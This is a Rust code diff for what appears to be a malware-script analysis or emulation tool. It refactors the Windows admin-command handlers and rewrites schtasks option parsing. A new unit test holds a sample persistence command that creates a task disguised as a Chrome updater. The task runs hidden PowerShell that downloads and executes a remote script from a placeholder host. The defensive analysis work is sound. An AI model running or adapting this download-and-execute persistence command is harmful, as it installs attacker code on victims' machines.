@@ -14,10 +14,7 @@ use crate::util::find_ascii_case_insensitive_from;
 macro_rules! make_handler {
     ($fn_name:ident, $cmd_name:literal) => {
         pub fn $fn_name(raw: &str, env: &mut Environment) {
-            env.traits.push(Trait::AdminCommand {
-                name: $cmd_name.to_string(),
-                cmd: raw.to_string(),
-            });
+            env.push_admin_command($cmd_name, raw);
         }
     };
 }
@@ -34,10 +31,7 @@ pub fn h_erase(raw: &str, env: &mut Environment) {
 }
 
 fn h_delete_like(raw: &str, env: &mut Environment, name: &str) {
-    env.traits.push(Trait::AdminCommand {
-        name: name.to_string(),
-        cmd: raw.to_string(),
-    });
+    env.push_admin_command(name, raw);
     let recursive = delete_is_recursive(raw);
     for candidate in delete_targets(raw) {
         remove_tracked_file(env, &candidate, recursive);
@@ -200,10 +194,7 @@ pub fn h_rd(raw: &str, env: &mut Environment) {
 }
 
 fn h_rmdir_like(raw: &str, env: &mut Environment, name: &str) {
-    env.traits.push(Trait::AdminCommand {
-        name: name.to_string(),
-        cmd: raw.to_string(),
-    });
+    env.push_admin_command(name, raw);
     for candidate in directory_delete_targets(raw) {
         remove_tracked_directory(env, &candidate);
     }
@@ -258,10 +249,7 @@ pub fn h_md(raw: &str, env: &mut Environment) {
 }
 
 fn h_mkdir_like(raw: &str, env: &mut Environment, name: &str) {
-    env.traits.push(Trait::AdminCommand {
-        name: name.to_string(),
-        cmd: raw.to_string(),
-    });
+    env.push_admin_command(name, raw);
     for candidate in directory_create_targets(raw) {
         track_directory(env, &candidate);
     }
@@ -305,10 +293,7 @@ fn track_directory(env: &mut Environment, candidate: &str) {
 pub fn h_reg(raw: &str, env: &mut Environment) {
     use once_cell::sync::Lazy;
     use regex::Regex;
-    env.traits.push(Trait::AdminCommand {
-        name: "reg".to_string(),
-        cmd: raw.to_string(),
-    });
+    env.push_admin_command("reg", raw);
     if !contains_ascii_case_insensitive(raw, "reg") || !contains_ascii_case_insensitive(raw, "add")
     {
         return;
@@ -456,37 +441,29 @@ make_handler!(h_tasklist, "tasklist");
 /// changes a scheduled task action (`schtasks /create|/change /tn X /tr Y`), also emits a
 /// Persistence trait — scheduled tasks are a primary autorun mechanism.
 pub fn h_schtasks(raw: &str, env: &mut Environment) {
-    use once_cell::sync::Lazy;
-    use regex::Regex;
-    env.traits.push(Trait::AdminCommand {
-        name: "schtasks".to_string(),
-        cmd: raw.to_string(),
-    });
+    env.push_admin_command("schtasks", raw);
     let is_create = contains_ascii_case_insensitive(raw, "/create");
     let is_change = contains_ascii_case_insensitive(raw, "/change");
     if !is_create && !is_change {
         return;
     }
-    static TN_RE: Lazy<Regex> =
-        Lazy::new(|| Regex::new(r#"(?i)/tn(?:\s+|[:=])(?:"([^"]+)"|(\S+))"#).expect("/tn regex"));
-    static TR_RE: Lazy<Regex> =
-        Lazy::new(|| Regex::new(r#"(?i)/tr(?:\s+|[:=])(?:"([^"]+)"|(.+))"#).expect("/tr regex"));
-    let task_name = TN_RE
-        .captures(raw)
-        .and_then(|c| {
-            c.get(1)
-                .or_else(|| c.get(2))
-                .map(|m| m.as_str().to_string())
+    let task_name = extract_schtasks_option_value(raw, "/tn")
+        .map(|(s, quoted)| {
+            if quoted {
+                s.trim().to_string()
+            } else {
+                s.split_whitespace().next().unwrap_or_default().to_string()
+            }
         })
         .unwrap_or_default();
-    let task_run = TR_RE
-        .captures(raw)
-        .and_then(|c| {
-            c.get(1)
-                .or_else(|| c.get(2))
-                .map(|m| m.as_str().to_string())
+    let task_run = extract_schtasks_option_value(raw, "/tr")
+        .map(|(s, quoted)| {
+            if quoted {
+                s.trim().to_string()
+            } else {
+                trim_schtasks_tr_tail(&s).to_string()
+            }
         })
-        .map(|s| trim_schtasks_tr_tail(&s).to_string())
         .unwrap_or_default();
     if is_change && task_run.is_empty() {
         return;
@@ -498,6 +475,50 @@ pub fn h_schtasks(raw: &str, env: &mut Environment) {
         command: task_run.clone(),
     });
     queue_child_command(task_run, env);
+}
+
+fn extract_schtasks_option_value(raw: &str, flag: &str) -> Option<(String, bool)> {
+    let start = find_schtasks_option_value_start(raw, flag)?;
+    let rest = raw[start..].trim_start();
+    if let Some(quoted) = rest.strip_prefix('"') {
+        let bytes = rest.as_bytes();
+        for idx in 1..bytes.len() {
+            if bytes[idx] == b'"' && bytes.get(idx.wrapping_sub(1)) != Some(&b'\\') {
+                return Some((rest[1..idx].to_string(), true));
+            }
+        }
+        return Some((quoted.to_string(), true));
+    }
+    Some((rest.to_string(), false))
+}
+
+fn find_schtasks_option_value_start(raw: &str, flag: &str) -> Option<usize> {
+    let lower = raw.to_ascii_lowercase();
+    let flag = flag.to_ascii_lowercase();
+    let bytes = raw.as_bytes();
+    let mut offset = 0usize;
+    while let Some(rel) = lower[offset..].find(&flag) {
+        let pos = offset + rel;
+        let after = pos + flag.len();
+        let before_ok = pos == 0 || bytes.get(pos - 1).is_some_and(u8::is_ascii_whitespace);
+        if before_ok && after < bytes.len() {
+            let mut idx = after;
+            match bytes[idx] {
+                b':' | b'=' => idx += 1,
+                b if b.is_ascii_whitespace() => {}
+                _ => {
+                    offset = after;
+                    continue;
+                }
+            }
+            while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
+                idx += 1;
+            }
+            return Some(idx);
+        }
+        offset = after;
+    }
+    None
 }
 
 fn queue_registry_persisted_command(command: String, env: &mut Environment) {
@@ -567,10 +588,7 @@ fn persisted_command_looks_dispatchable(command: &str) -> bool {
 }
 
 pub fn h_at(raw: &str, env: &mut Environment) {
-    env.traits.push(Trait::AdminCommand {
-        name: "at".to_string(),
-        cmd: raw.to_string(),
-    });
+    env.push_admin_command("at", raw);
     let Some((time, command)) = at_scheduled_command(raw) else {
         return;
     };
@@ -1050,10 +1068,7 @@ fn split_word_spans(raw: &str) -> Vec<std::ops::Range<usize>> {
 }
 
 pub fn h_sc(raw: &str, env: &mut Environment) {
-    env.traits.push(Trait::AdminCommand {
-        name: "sc".to_string(),
-        cmd: raw.to_string(),
-    });
+    env.push_admin_command("sc", raw);
     if let Some((service_name, bin_path)) = sc_service_binpath(raw) {
         env.traits.push(Trait::ServiceInstall {
             service_name,
@@ -1390,6 +1405,34 @@ mod tests {
             )),
             "attached quoted task action was not preserved: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn schtasks_tr_preserves_backslash_escaped_inner_quotes() {
+        let mut env = Environment::new(&Config::default());
+        h_schtasks(
+            r#"schtasks /create /sc minute /mo 60 /f /tn achromeupdater /tr "powershell -w hidden \"add-type -assemblyname system.core;iex (new-object net.webclient).downloadstring('http://schtasks-escaped.example/hpjs.php');\"""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, command, .. }
+                    if hive == "ScheduledTask"
+                        && key == "achromeupdater"
+                        && command.contains("downloadstring('http://schtasks-escaped.example/hpjs.php')")
+            )),
+            "escaped quoted /tr action was not preserved: {:?}",
+            env.traits
+        );
+        assert!(
+            env.exec_cmd
+                .iter()
+                .any(|cmd| cmd.contains("http://schtasks-escaped.example/hpjs.php")),
+            "escaped quoted /tr action was not queued: {:?}",
+            env.exec_cmd
         );
     }
 
